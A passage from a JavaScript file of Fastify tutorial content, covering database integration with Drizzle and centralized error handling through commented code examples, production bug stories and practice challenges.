//   }
//
//   async findByCustomer(customerId, { page = 1, limit = 20 }) {
//     return this.db.query.orders.findMany({
//       where: eq(orders.customerId, customerId),
//       with: {
//         items: { with: { product: { columns: { name: true, imageUrl: true } } } },
//         // ↑ JOIN — no N+1!
//       },
//       orderBy: desc(orders.createdAt),
//       limit, offset: (page - 1) * limit
//     });
//   }
//
//   async create(data, tx) {
//     const dbOrTx = tx ?? this.db; // Use transaction if provided, else db
//     const [order] = await dbOrTx.insert(orders).values(data).returning();
//     return order;
//   }
// }
//
// // Route using the repository:
// fastify.get('/orders', { preHandler: [fastify.authenticate] }, async (request) => {
//   const repo = new OrderRepository(fastify.db);
//   return repo.findByCustomer(request.user.sub, request.query);
// });

// EXAMPLE 3: Transaction in route handler — explicit parameter passing

// fastify.post('/checkout', {
//   preHandler: [fastify.authenticate],
//   schema: { body: checkoutSchema }
// }, async (request, reply) => {
//   const { items, shippingAddress, paymentMethod } = request.body;
//   const customerId = parseInt(request.user.sub);
//
//   const result = await fastify.db.transaction(async (tx) => {
//     // Validate stock:
//     for (const item of items) {
//       const [product] = await tx.select({ stock: products.stock })
//         .from(products).where(eq(products.id, item.productId));
//       if (!product || product.stock < item.quantity) {
//         throw new Error(\`Insufficient stock for product \${item.productId}\`);
//       }
//     }
//
//     // Decrement stock:
//     for (const item of items) {
//       await tx.update(products)
//         .set({ stock: sql\`stock - \${item.quantity}\` })
//         .where(eq(products.id, item.productId));
//     }
//
//     // Create order (pass tx explicitly — not fastify.db!):
//     const total = items.reduce((s, i) => s + i.price * i.quantity, 0);
//     const [order] = await tx.insert(orders)
//       .values({ customerId, total: total.toString(), status: 'pending' })
//       .returning({ id: orders.id, publicId: orders.publicId });
//
//     // Create order items:
//     await tx.insert(orderItems).values(
//       items.map(i => ({ orderId: order.id, productId: i.productId,
//         quantity: i.quantity, unitPrice: i.price.toString() }))
//     );
//
//     return order;
//   });
//
//   return reply.status(201).send(result);
// });

// EXAMPLE 4: Avoiding N+1 — before and after

// BAD — N+1 pattern:
// fastify.get('/sellers/:id/products', async (request) => {
//   const products = await fastify.db.select().from(products)
//     .where(eq(products.sellerId, request.params.id));
//
//   // For each product, separately fetch category — N+1!
//   for (const product of products) {
//     product.category = await fastify.db.select().from(categories)
//       .where(eq(categories.id, product.categoryId)); // 1 query per product!
//   }
//   return products;
// });

// GOOD — Single query with join:
// fastify.get('/sellers/:id/products', async (request) => {
//   return fastify.db.query.products.findMany({
//     where: eq(products.sellerId, request.params.id),
//     with: {
//       category: { columns: { id: true, name: true, slug: true } }
//     },
//     // Drizzle generates: SELECT products.*, categories.id, categories.name
//     // FROM products JOIN categories ON products.category_id = categories.id
//     // WHERE products.seller_id = :id
//     // → 1 query for all products + their categories
//   });
// });

// EXAMPLE 5: Connection pool monitoring and health check

// fastify.get('/health/db', { config: { public: true } }, async (request, reply) => {
//   try {
//     const start = Date.now();
//     await fastify.db.execute(sql\`SELECT 1\`);
//     const latency = Date.now() - start;
//
//     const poolStatus = {
//       totalConnections: fastify.dbPool.totalCount,
//       idleConnections: fastify.dbPool.idleCount,
//       waitingClients: fastify.dbPool.waitingCount,
//       latencyMs: latency
//     };
//
//     if (latency > 1000) {
//       return reply.status(503).send({ status: 'degraded', db: poolStatus });
//     }
//     return { status: 'healthy', db: poolStatus };
//   } catch (err) {
//     fastify.log.error({ err }, 'Database health check failed');
//     return reply.status(503).send({ status: 'unhealthy', error: 'Database unavailable' });
//   }
// });

// EXAMPLE 6: Pagination with Drizzle — cursor vs offset

// // Cursor-based pagination (efficient for large datasets):
// fastify.get('/products', async (request) => {
//   const { limit = 20, cursor } = request.query;
//   const conditions = [eq(products.isActive, true)];
//
//   if (cursor) {
//     const { id } = JSON.parse(Buffer.from(cursor, 'base64url').toString());
//     conditions.push(lt(products.id, id)); // Cursor: "give me items before this ID"
//   }
//
//   const rows = await fastify.db.select({
//     id: products.id, name: products.name, price: products.price, stock: products.stock
//   })
//   .from(products)
//   .where(and(...conditions))
//   .orderBy(desc(products.id))
//   .limit(limit + 1); // Fetch one extra to detect "has next page"
//
//   const hasNext = rows.length > limit;
//   const items = hasNext ? rows.slice(0, -1) : rows;
//   const nextCursor = hasNext
//     ? Buffer.from(JSON.stringify({ id: items.at(-1).id })).toString('base64url')
//     : null;
//
//   return { items, nextCursor, hasNext };
// });

// EXAMPLE 7: Multi-tenant query safety

// // Centralized tenant-safe query helper:
// fastify.decorate('tenantQuery', function(tenantId) {
//   return {
//     orders: {
//       findMany: (opts = {}) => fastify.db.query.orders.findMany({
//         ...opts,
//         where: and(eq(orders.tenantId, tenantId), opts.where)
//       }),
//       findById: (id) => fastify.db.query.orders.findFirst({
//         where: and(eq(orders.id, id), eq(orders.tenantId, tenantId))
//       })
//     }
//   };
// });
//
// // In route:
// fastify.get('/orders/:id', { preHandler: [fastify.authenticate] }, async (request) => {
//   const q = fastify.tenantQuery(request.user.tenantId);
//   const order = await q.orders.findById(parseInt(request.params.id));
//   if (!order) return request.server.httpErrors.notFound('Order not found');
//   return order;
// });
    `,
    bugs: `
REAL PRODUCTION BUGS FROM DATABASE INTEGRATION MISUNDERSTANDING:
----------------------------------------------------------------

BUG 1: Creating a new pool per request — connection pool exhaustion
  Scenario: Developer created a new Pool inside the route handler:
    fastify.get('/users', async () => {
      const pool = new Pool({ connectionString: process.env.DB_URL }); // New pool!
      const db = drizzle(pool, { schema });
      const users = await db.select().from(usersTable);
      // pool never closed!
      return users;
    });
    Each request: 1 new pool, 10 new connections. At 100 concurrent requests: 1000 connections.
    PostgreSQL max_connections = 100. Error: "too many clients" after 10 requests.
    Server down within seconds of traffic spike.
  Fix: Create pool ONCE in plugin, decorate, reuse:
    // In plugin: fastify.decorate('db', drizzle(pool));
    // In route: fastify.db.select()... (same pool for all requests)

BUG 2: Missing onClose hook — PostgreSQL "too many clients" on redeploy
  Scenario: Server deployed with rolling restart (new instance starts before old one stops).
    Old instance: pool not closed (no onClose hook). 20 connections hang.
    New instance: fresh pool adds 20 more connections.
    After 5 rolling restarts: 100 connections (PostgreSQL limit). New deployments fail.
  Root cause: pg Pool connections are not automatically released when Node process exits.
    Without pool.end(): connections remain "active" in PostgreSQL's view.
  Fix:
    fastify.addHook('onClose', async () => {
      await pool.end();
      fastify.log.info('Pool closed');
    });
    Also: handle SIGTERM for graceful shutdown (see concept 10).

BUG 3: Using fastify.db inside transaction instead of tx — lost atomicity
  Scenario: Checkout transaction:
    await fastify.db.transaction(async (tx) => {
      await tx.update(inventory).set({ reserved: sql\`reserved + 1\` }).where(...);
      const [order] = await fastify.db.insert(orders).values({...}).returning(); // Wrong!
      await tx.insert(orderItems).values({ orderId: order.id, ...});
    });
    fastify.db.insert(orders) ran on a DIFFERENT connection (not tx).
    If tx rolls back: inventory reservation undone, but order row COMMITTED separately.
    Result: order exists in DB with no matching inventory reservation.
  Fix: Always use tx inside transaction callbacks:
    const [order] = await tx.insert(orders).values({...}).returning(); // Use tx, not fastify.db

BUG 4: N+1 in a list endpoint causing 30-second response times
  Scenario: Product listing for a seller dashboard:
    const prods = await fastify.db.select().from(products)
      .where(eq(products.tenantId, tenantId)); // Returns 200 products
    for (const p of prods) {
      p.category = (await fastify.db.select().from(categories)
        .where(eq(categories.id, p.categoryId)))[0]; // 200 separate queries!
      p.reviews = await fastify.db.select().from(reviews)
        .where(eq(reviews.productId, p.id)); // 200 more queries!
    }
    Total: 401 queries. Response time: 30 seconds. Seller dashboard unusable.
  Root cause: Classic N+1. One query per related entity.
  Fix: Use Drizzle's relational API (single JOIN query):
    return fastify.db.query.products.findMany({
      where: eq(products.tenantId, tenantId),
      with: { category: true, reviews: { columns: { rating: true } } }
    });
    // 1-2 queries total. Response time: <200ms.

BUG 5: Connection timeout not configured — requests hang indefinitely
  Scenario: Database overloaded. All connections in pool busy.
    New requests wait for an available connection.
    No connectionTimeoutMillis configured (default: no timeout = wait forever).
    Requests queue up waiting for connections. Server appears frozen.
    Load balancer health check: timeout → server marked unhealthy → taken out of rotation.
    Recovery impossible: health check endpoint also waiting for DB connection.
  Fix: Always configure connection timeout:
    const pool = new Pool({
      max: 10,
      connectionTimeoutMillis: 5000,  // Throw after 5s waiting for connection
      idleTimeoutMillis: 30000,
    });
    Handle the timeout error gracefully:
    fastify.setErrorHandler(async (error, request, reply) => {
      if (error.message?.includes('timeout')) {
        return reply.status(503).send({ error: 'Service temporarily unavailable' });
      }
      // ...
    });
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — TRACE THE DB LIFECYCLE:
  Server setup:
  fastify.register(configPlugin);
  fastify.register(databasePlugin); // fp-wrapped, creates pool, decorates fastify.db
  fastify.register(userRoutes, { prefix: '/users' });

  For each event, describe what happens to the database connection pool:
  a) Server starts: what happens during databasePlugin registration?
  b) GET /users/1 arrives: how does the route get access to the database?
  c) 50 concurrent requests arrive: how does the pool handle this? What if pool.max is 10?
  d) SIGTERM received (server shutting down): what should happen to in-flight queries?
     What should happen to the pool itself?
  e) Database goes offline mid-request: what error is thrown? Where should it be caught?

CHALLENGE 2 — FIX THE DB BUGS:
  This route handler has 3 database integration bugs. Find and fix each.

  fastify.post('/orders/:id/fulfill', async (request, reply) => {
    const orderId = request.params.id;

    // Bug 1: Direct transaction, but line inside uses fastify.db not tx
    await fastify.db.transaction(async (tx) => {
      await tx.update(orders).set({ status: 'processing' }).where(eq(orders.id, orderId));

      const items = await tx.select().from(orderItems).where(eq(orderItems.orderId, orderId));

      for (const item of items) {
        // Bug 2: N+1 — fetching product inside loop
        const [product] = await fastify.db.select().from(products) // Bug 1 here too: fastify.db!
          .where(eq(products.id, item.productId));
        await tx.update(inventory).set({ reserved: sql\`reserved - \${item.quantity}\` })
          .where(eq(inventory.productId, item.productId));
      }

      await fastify.db.update(orders) // Bug 1 again: fastify.db not tx
        .set({ status: 'fulfilled', fulfilledAt: new Date() })
        .where(eq(orders.id, orderId));
    });
    // Bug 3: No response sent
  });

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a complete database integration layer for a food delivery app.

  Requirements:
  1. Database plugin: pg Pool with proper config (max, timeout, ssl), Drizzle,
     fail-fast connectivity check, onClose cleanup, pool error logging

  2. Schema: restaurants, menu_items, orders, order_items, delivery_agents
     - orders has status enum: 'pending', 'accepted', 'preparing', 'ready', 'picked_up', 'delivered'

  3. Route: POST /orders — create a new order
     - Transaction: validate items exist + in stock, create order + items, update inventory
     - Uses tx throughout (no fastify.db inside transaction)
     - Returns: { orderId, items, totalAmount, estimatedDelivery }

  4. Route: GET /restaurants/:id/menu — list menu items
     - No N+1: join menu_items with categories in single query
     - Cursor pagination
     - Response schema strips internal fields (costPrice, supplierId)

  5. Route: GET /orders/:id/track — real-time status
     - Joins order with delivery agent if assigned
     - Returns agent location only if status is 'picked_up' or 'delivered'
     - 404 if order not found

  Show: plugin file, TypeScript interface for fastify.db, all route handlers
    `,
    summary: `Database integration in Fastify follows a single golden rule: create the pool once (in a fp-wrapped plugin), decorate it onto the Fastify instance, and clean it up with onClose. The two most impactful practices are always using tx (not fastify.db) inside transaction callbacks to maintain atomicity, and using Drizzle's relational API or SQL JOINs to prevent N+1 queries that silently scale from 20ms to 20 seconds as data grows.`
  },

  {
    id: 8,
    title: "Error Handling in Fastify",
    tag: "CENTRALIZED, TYPED, AND PRODUCTION-SAFE ERROR MANAGEMENT",
    color: "#7F1D1D",
    tldr: `Fastify centralizes error handling through setErrorHandler — a global (or scoped) handler that intercepts all thrown errors, validation failures, and unhandled rejections before they reach the client. @fastify/sensible adds semantic HTTP error factories (httpErrors.notFound(), httpErrors.badRequest()) that produce properly structured responses. Production error handling means sending safe, sanitized messages to clients while logging full stack traces server-side.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"My server crashes when a route throws an error — how do I handle errors globally?"
  → Fastify catches all unhandled errors from routes and hooks.
  → Default behavior: sends 500 with { statusCode: 500, error: 'Internal Server Error', message: err.message }
  → setErrorHandler(): customize exactly what gets sent vs logged.
  → Never crashes the server for request-level errors. Only uncaughtException crashes Node.

"AJV validation errors are exposing my internal schema structure — how do I sanitize?"
  → Validation errors: error.validation is an array of AJV error objects with field paths.
  → These expose: your schema structure, field names, internal validation rules.
  → In setErrorHandler: check if error.validation exists → map to user-friendly messages.
  → Replace: [{ instancePath: '/body/phone', message: 'must match pattern '^[6-9]\\d{9}\$'' }]
  → With: [{ field: 'phone', message: 'Please enter a valid 10-digit mobile number' }]

"What's @fastify/sensible and why use it?"
  → Adds fastify.httpErrors.badRequest(), notFound(), unauthorized(), forbidden(), etc.
  → These throw proper HTTP error objects with correct statusCode and standard message.
  → Without sensible: manually create Error objects with statusCode property.
  → With sensible: throw fastify.httpErrors.notFound('Product not found') → clean 404.

"My stack traces are appearing in API responses in production — security risk!"
  → Fastify's default error handler includes error.message in the response.
  → If error.message contains stack trace info or internal details: exposed to clients.
  → setErrorHandler: differentiate between operational errors (safe to surface) vs
    programming errors (log but hide from clients).
  → NODE_ENV === 'production': never send stack, always log it server-side.

"How do I return different error responses for different error types?"
  → setErrorHandler receives the error object. Check properties:
  → error.validation: AJV validation error → 400 with field-level details
  → error.statusCode: HTTP error from httpErrors → use that status code
  → error.code === 'ECONNREFUSED': DB connection error → 503
  → Unknown errors → 500 with generic message, full details logged
    `,
    analogy: `
THE HOSPITAL EMERGENCY TRIAGE ANALOGY:
----------------------------------------
Errors = patients arriving at emergency.
setErrorHandler = the triage nurse who decides treatment.
Client response = what gets communicated to the patient's family.
Server log = the medical record (full details, internal).

WITHOUT setErrorHandler (DEFAULT):
  Every error goes directly to the patient's family with the full medical chart.
  "Patient has [STACK TRACE showing internal system details]"
  Security risk: internal implementation visible. Confusing to users.

WITH setErrorHandler (TRIAGE):
  Nurse (setErrorHandler) categorizes each patient (error):
  
  Category 1 — Known patient (httpErrors.notFound()):
    "Product not found" — already properly labeled. Send the label to the family.
    reply.status(404).send({ error: 'Not Found', message: 'Product not found' })
  
  Category 2 — Misunderstanding (error.validation — AJV):
    "Patient claims to have symptoms we don't recognize" — schema mismatch.
    Translate the medical jargon into plain language for the family:
    "Please check: phone number format, email address format."
    Never tell the family: "pattern '^[6-9]\\d{9}\$' match failed at /body/phone"
  
  Category 3 — Unknown emergency (status >= 500):
    Nurse: calls doctor (logs full stack trace, error details).
    Family gets: "We're working on it. Please wait." (generic message, no details)
    Patient record: full diagnosis documented internally. HIPAA compliance.

@FASTIFY/SENSIBLE = THE PRE-LABELED PATIENT CATEGORIES:
  Instead of manually creating:
    const err = new Error('Product not found'); err.statusCode = 404; throw err;
  
  Pre-labeled categories (httpErrors):
    throw fastify.httpErrors.notFound('Product not found')     // 404
    throw fastify.httpErrors.badRequest('Invalid amount')      // 400
    throw fastify.httpErrors.unauthorized('Token expired')     // 401
    throw fastify.httpErrors.forbidden('Admin access required') // 403
    throw fastify.httpErrors.conflict('Email already exists')   // 409
    throw fastify.httpErrors.tooManyRequests('Rate limited')   // 429
    throw fastify.httpErrors.internalServerError(...)          // 500 (use sparingly)
  
  Each one: correct statusCode, correct HTTP reason phrase, your custom message.
  All caught by setErrorHandler. All treated consistently.

ERROR SCOPING = SPECIALIZED UNITS IN THE HOSPITAL:
  Root setErrorHandler: general emergency. Catches everything.
  Plugin-scoped setErrorHandler: specialized unit (cardiology, neurology).
  Plugin's errors go to its specialist first. Then fall through to general if not handled.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — ERROR HANDLING INTERNALS:
----------------------------------------------------

ERROR FLOW IN FASTIFY:
  1. Error thrown/rejected in hook or handler.
  2. Fastify catches the unhandled promise rejection or synchronous throw.
  3. onError hooks fire (if registered) — for side effects (logging, metrics).
  4. setErrorHandler is called: (error, request, reply) => ...
  5. setErrorHandler must send a response via reply.send() or throw again.
  6. If setErrorHandler throws: Fastify's last-resort handler sends 500.

ERROR OBJECT STRUCTURE:
  Fastify HTTP errors (from @fastify/sensible or http-errors):
    { message: 'Not Found', statusCode: 404, error: 'Not Found' }
  
  AJV validation errors (Fastify wraps them):
    {
      statusCode: 400,
      message: 'body must have required property \'email\'',
      validation: [
        {
          instancePath: '/body/email',
          schemaPath: '#/properties/email/type',
          keyword: 'required',
          params: { missingProperty: 'email' },
          message: 'must have required property \'email\''
        }
      ],
      validationContext: 'body'  // 'body' | 'params' | 'querystring' | 'headers'
    }
  
  Custom application errors (best practice):
    class AppError extends Error {
      constructor(message, statusCode, code) {
        super(message);
        this.statusCode = statusCode;
        this.code = code;       // e.g. 'INSUFFICIENT_STOCK', 'DUPLICATE_EMAIL'
        this.isOperational = true; // Distinguish from programming errors
      }
    }

SETAUTHORHANDLER SCOPE:
  Root: fastify.setErrorHandler(handler) — catches ALL unhandled errors.
  Plugin: inside a plugin without fp → catches errors only from that plugin's routes.
  Hierarchy: plugin's error handler runs first. If it throws or doesn't handle: parent's handler.
  
  Pattern for layered handling:
    // Root: global fallback
    fastify.setErrorHandler(globalErrorHandler);
    
    // Plugin scope: specialized handler for API routes
    fastify.register(async function apiPlugin(fastify) {
      fastify.setErrorHandler(apiErrorHandler); // Handles API errors with JSON
      fastify.register(userRoutes);
    });
    
    fastify.register(async function webhookPlugin(fastify) {
      fastify.setErrorHandler(webhookErrorHandler); // Different format for webhooks
      fastify.register(webhookRoutes);
    });

PRODUCTION vs DEVELOPMENT ERROR RESPONSES:
  Development: show full error details (message, stack, validation details).
  Production: sanitize — never expose stack traces, internal error messages, schema paths.
  
  Template for setErrorHandler:
    if (isProd) {
      if (isOperationalError) { send friendly message }
      else { log full error, send generic 500 }
    } else {
      send everything (for debugging)
    }

VALIDATION ERROR CUSTOMIZATION:
  Option 1 — Override in setErrorHandler (global):
    Transform error.validation array to user-friendly format.
  
  Option 2 — Custom AJV error messages (per-field):
    Schema: { type: 'string', errorMessage: 'Please enter a valid email address' }
    Requires: ajv-errors plugin.
  
  Option 3 — attachValidation: true (per-route):
    Validation errors attached to request instead of thrown.
    Handler decides how to present them.
  
  AJV validation error instancePath:
    '/body/email' → field: 'email' (strip '/body/')
    '/body/address/pincode' → field: 'address.pincode'
    '/body/items/0/quantity' → field: 'items[0].quantity'
    Parse with: instancePath.replace(/^\\/(body|params|query)\\//, '').replace(/\\//g, '.')

NOT FOUND HANDLER:
  Fastify has setNotFoundHandler separate from setErrorHandler:
    fastify.setNotFoundHandler(async (request, reply) => {
      reply.status(404).send({ error: 'Route not found', path: request.url });
    });
  This handles 404s from the router (no matching route) — different from throwing httpErrors.notFound().
    `,
    code: `
// ===== ERROR HANDLING IN FASTIFY — EXAMPLES =====

// EXAMPLE 1: Production-ready global error handler

// fastify.setErrorHandler(async (error, request, reply) => {
//   const isProd = fastify.config.env === 'production';
//
//   // Log ALL errors server-side with full context:
//   const logData = {
//     err: { message: error.message, stack: error.stack, code: error.code },
//     request: { method: request.method, url: request.url, id: request.id },
//     user: request.user?.sub
//   };
//
//   // ---- VALIDATION ERRORS (AJV) ----
//   if (error.validation) {
//     request.log.warn(logData, 'Request validation failed');
//     return reply.status(400).send({
//       error: 'Validation Error',
//       message: 'Request data is invalid',
//       fields: error.validation.map(v => ({
//         field: v.instancePath
//           .replace(/^\/(body|params|querystring|headers)\//, '')
//           .replace(/\//g, '.') || v.params?.missingProperty,
//         message: v.message
//       }))
//     });
//   }
//
//   // ---- HTTP ERRORS (from httpErrors.notFound() etc) ----
//   if (error.statusCode && error.statusCode < 500) {
//     request.log.info(logData, 'Client error');
//     return reply.status(error.statusCode).send({
//       error: error.name || 'Error',
//       message: error.message
//     });
//   }
//
//   // ---- OPERATIONAL APPLICATION ERRORS ----
//   if (error.isOperational) {
//     request.log.warn(logData, 'Operational error');
//     return reply.status(error.statusCode || 500).send({
//       error: error.code || 'Application Error',
//       message: error.message
//     });
//   }
//
//   // ---- UNKNOWN/PROGRAMMING ERRORS (5xx) ----
//   request.log.error(logData, 'Unhandled error');
//   return reply.status(500).send({
//     error: 'Internal Server Error',
//     message: isProd ? 'An unexpected error occurred' : error.message
//   });
// });

// EXAMPLE 2: @fastify/sensible — semantic HTTP errors

// fastify.register(require('@fastify/sensible'));
//
// fastify.get('/products/:id', async (request, reply) => {
//   const product = await fastify.db.getProduct(request.params.id);
//   if (!product) throw fastify.httpErrors.notFound('Product not found'); // 404
//
//   if (product.tenantId !== request.user.tenantId)
//     throw fastify.httpErrors.forbidden('Access denied to this product'); // 403
//
//   if (!product.isActive)
//     throw fastify.httpErrors.gone('This product is no longer available'); // 410
//
//   return product;
// });
//
// fastify.post('/products', async (request, reply) => {
//   const existing = await fastify.db.findProductBySku(request.body.sku);
//   if (existing) throw fastify.httpErrors.conflict('Product with this SKU already exists'); // 409
//
//   if (request.body.price <= 0)
//     throw fastify.httpErrors.badRequest('Price must be greater than 0'); // 400
//
//   const product = await fastify.db.createProduct(request.body);
//   return reply.status(201).send(product);
// });

// EXAMPLE 3: Custom AppError class for domain errors

class InsufficientStockError extends Error {
  constructor(productId, requested, available) {
    super(\`Insufficient stock for product \${productId}: requested \${requested}, available \${available}\`);
    this.name = 'InsufficientStockError';
    this.statusCode = 409;
    this.code = 'INSUFFICIENT_STOCK';
    this.isOperational = true;
    this.details = { productId, requested, available };
  }
}

class PaymentDeclinedError extends Error {
  constructor(reason) {
    super(\`Payment declined: \${reason}\`);
    this.name = 'PaymentDeclinedError';
    this.statusCode = 402;
    this.code = 'PAYMENT_DECLINED';
    this.isOperational = true;
  }
}

// Usage in route:
// async function processCheckout(items, paymentDetails) {
//   for (const item of items) {
//     const product = await getProduct(item.productId);
//     if (product.stock < item.quantity) {
//       throw new InsufficientStockError(item.productId, item.quantity, product.stock);
//     }
//   }
//   const paymentResult = await chargeCard(paymentDetails);
//   if (!paymentResult.success) throw new PaymentDeclinedError(paymentResult.reason);
// }

// EXAMPLE 4: Not found handler and 404 on unknown routes

// fastify.setNotFoundHandler(async (request, reply) => {
//   request.log.info({ url: request.url, method: request.method }, 'Route not found');
//   return reply.status(404).send({
//     error: 'Not Found',
//     message: \`Route \${request.method} \${request.url} does not exist\`,
//     availableAt: 'https://docs.myapi.com'
//   });
// });

// EXAMPLE 5: Scoped error handler for a specific plugin

// fastify.register(async function paymentRoutes(fastify) {
//   // Payment-specific error handler — wraps Stripe/Razorpay errors:
//   fastify.setErrorHandler(async (error, request, reply) => {
//     // Handle payment gateway errors specifically:
//     if (error.type === 'StripeCardError') {
//       return reply.status(402).send({
//         error: 'Payment Failed',
//         message: error.message, // Stripe errors are user-safe
//         code: error.code        // e.g., 'card_declined', 'insufficient_funds'
//       });
//     }
//     if (error.type === 'StripeRateLimitError') {
//       return reply.status(429).send({ error: 'Rate Limited', message: 'Too many payment attempts' });
//     }
//     // Unknown payment errors: throw to parent handler
//     throw error;
//   });
//
//   fastify.post('/pay', paymentHandler);
//   fastify.post('/refund', refundHandler);
// }, { prefix: '/payments' });

// EXAMPLE 6: Validation error format customization

// Custom validation error formatting in setErrorHandler:
// const formatValidationErrors = (validation, context) => {
//   return validation.map(v => {
//     const field = v.instancePath
//       .replace(new RegExp(\`^/\${context}/?\`), '')  // Remove '/body/' prefix
//       .replace(/\//g, '.')                          // /address/city → address.city
//       || v.params?.missingProperty;                 // For 'required' errors
//
//     // Map technical messages to user-friendly ones:
//     const messages = {
//       'must match pattern': 'Invalid format',
//       'must be >= 0': 'Must be a positive number',
//       'must NOT have fewer than 1 items': 'At least one item required',
//       'must have required property': 'This field is required'
//     };
//
//     const message = Object.entries(messages)
//       .find(([key]) => v.message?.includes(key))?.[1]
//       ?? v.message;
//
//     return { field, message };
//   });
// };

// EXAMPLE 7: Error monitoring integration (Sentry/similar)

// fastify.setErrorHandler(async (error, request, reply) => {
//   // Send 5xx errors to error monitoring:
//   if (!error.statusCode || error.statusCode >= 500) {
//     Sentry.withScope((scope) => {
//       scope.setUser({ id: request.user?.sub, email: request.user?.email });
//       scope.setTag('requestId', request.id);
//       scope.setTag('route', request.routeOptions?.url);
//       scope.setContext('request', {
//         method: request.method, url: request.url, body: request.body
//       });
//       Sentry.captureException(error);
//     });
//   }
//
//   // ... rest of error handler
// });
    `,
    bugs: `
REAL PRODUCTION BUGS FROM ERROR HANDLING MISUNDERSTANDING:
----------------------------------------------------------

BUG 1: Stack traces in production responses — security information disclosure
  Scenario: No setErrorHandler. Fastify default handler ran.
    Database error: "relation 'user_sessions' does not exist at character 15"
    Default response included full error.message.
    Response to client: { message: "relation 'user_sessions' does not exist at character 15" }
    Exposed: internal table names, SQL query structure, PostgreSQL version clues.
    Attacker mapped the database schema from error messages over weeks.
  Root cause: No production error sanitization.
  Fix:
    fastify.setErrorHandler(async (error, request, reply) => {
      request.log.error({ err: error }, 'Unhandled error'); // Log full details
      if (!error.statusCode || error.statusCode >= 500) {
        return reply.status(500).send({ error: 'Internal Server Error' }); // No message!
      }
      reply.status(error.statusCode).send({ error: error.message });
    });

BUG 2: setErrorHandler not re-throwing unknown errors — silent swallow
  Scenario: Scoped error handler for payment routes:
    fastify.setErrorHandler(async (error, request, reply) => {
      if (error.type === 'StripeCardError') {
        return reply.status(402).send({ error: error.message });
      }
      // BUG: handler returns without sending response for non-Stripe errors!
      // Fastify: setErrorHandler didn't send response or throw → undefined behavior.
      // In some versions: request hangs. In others: empty response.
    });
    Non-Stripe errors (DB errors, validation): requests hung indefinitely.
    Health check failed. Server marked unhealthy. Incident.
  Root cause: setErrorHandler MUST either send a response or re-throw.
    Not doing either = undefined behavior.
  Fix:
    fastify.setErrorHandler(async (error, request, reply) => {
      if (error.type === 'StripeCardError') {
        return reply.status(402).send({ error: error.message });
      }
      throw error; // Re-throw to parent handler for all other errors!
    });

BUG 3: Throwing non-Error objects — loses stack trace
  Scenario: Developer threw a plain string in a route:
    if (!product) throw 'Product not found'; // Throwing string, not Error!
    setErrorHandler received: error = 'Product not found' (a string).
    error.message = undefined. error.statusCode = undefined.
    Handler logic: if (error.statusCode < 500) → TypeError: Cannot read property '<' of undefined
    Error handler itself crashed! Unhandled exception. Server: uncaughtException.
  Root cause: Always throw Error objects (or classes extending Error).
    Plain strings, numbers, objects: have no stack trace, no standard properties.
  Fix:
    throw fastify.httpErrors.notFound('Product not found'); // Always throw Error objects
    // Or: throw new Error('Product not found'); (then let setErrorHandler add statusCode)

BUG 4: AJV validation context mismatch in error formatting
  Scenario: setErrorHandler stripped '/body/' prefix from instancePath.
    Works for body errors: '/body/email' → 'email' ✓
    But querystring errors: '/querystring/page' → still 'page' (after fix)? No!
    Developer's regex: instancePath.replace('/body/', '') only removes '/body/'.
    For querystring: '/querystring/page' → '/querystring/page' (unchanged!)
    User-facing error: field = '/querystring/page'. Confusing, looks like internal path.
  Root cause: AJV instancePath prefix varies by validationContext (body, querystring, params, headers).
  Fix: Use the validationContext from the error:
    const prefix = \`/\${error.validationContext}/\`;
    const field = v.instancePath.replace(prefix, '').replace(/\\//g, '.');

BUG 5: Not registering sensible before route plugins — httpErrors undefined
  Scenario:
    fastify.register(userRoutes); // Routes registered first
    fastify.register(require('@fastify/sensible')); // Sensible registered after
    
    userRoutes.js:
    throw fastify.httpErrors.notFound('User not found'); // httpErrors undefined!
    
    Error at startup: "fastify.httpErrors is not a function"
  Root cause: Fastify plugins load in registration order (avvio).
    userRoutes loaded before sensible → fastify.httpErrors not yet available.
  Fix: Register @fastify/sensible (and all utility plugins) BEFORE route plugins:
    fastify.register(require('@fastify/sensible'));
    fastify.register(userRoutes); // Now fastify.httpErrors is available
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — PREDICT THE ERROR RESPONSE:
  setErrorHandler:
  fastify.setErrorHandler(async (error, request, reply) => {
    if (error.validation) {
      return reply.status(400).send({ type: 'validation', fields: error.validation.length });
    }
    if (error.statusCode) {
      return reply.status(error.statusCode).send({ type: 'http', message: error.message });
    }
    return reply.status(500).send({ type: 'internal' });
  });

  For each scenario, predict: status code, response body:
  a) Route throws: throw fastify.httpErrors.notFound('Product #42 not found')
  b) Route throws: throw new Error('Database connection failed')
  c) AJV validation fails on required field 'email'
  d) Route throws: const e = new Error('Unauthorized'); e.statusCode = 401; throw e;
  e) setErrorHandler itself throws: throw new Error('Handler crashed')
     What happens? Who catches this second error?

CHALLENGE 2 — FIX THE ERROR HANDLING BUGS:
  This error handler has 3 bugs. Find and fix each.

  fastify.setErrorHandler(async (error, request, reply) => {
    // Bug 1: Stack trace in production response
    return reply.status(500).send({
      error: error.message,   // Exposes internal details
      stack: error.stack      // Exposes file paths, line numbers
    });
  });

  // Bug 2: Throwing string instead of Error
  fastify.get('/orders/:id', async (request, reply) => {
    const order = await fastify.db.getOrder(request.params.id);
    if (!order) throw 'Order not found';  // Wrong! Should be Error object
    return order;
  });

  // Bug 3: Scoped error handler with no fallback
  fastify.register(async function apiRoutes(fastify) {
    fastify.setErrorHandler(async (error, request, reply) => {
      if (error.statusCode === 429) {
        return reply.status(429).send({ error: 'Rate limited' });
      }
      // All other errors: no response sent, no re-throw — BUG!
    });
  });

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a complete error handling system for a payment API.

  Requirements:
  1. Custom error classes:
     - ValidationError(field, message) → 400
     - ResourceNotFoundError(resource, id) → 404
     - DuplicateResourceError(resource, field) → 409
     - PaymentError(code, message) → 402
     - InsufficientBalanceError(required, available) → 402

  2. Global setErrorHandler that:
     - Handles AJV validation errors → user-friendly field messages (no internal paths)
     - Handles all custom error classes → appropriate status + safe message
     - Handles pg/drizzle DB errors → 503 (service unavailable) without exposing SQL
       (detect by: error.code matches PostgreSQL error codes like '23505', '23503', etc.)
     - Handles unknown errors → 500 with generic message in production, full message in dev
     - Logs all 5xx errors with full context (requestId, userId, url, stack)

  3. setNotFoundHandler for unmatched routes

  4. A test that verifies:
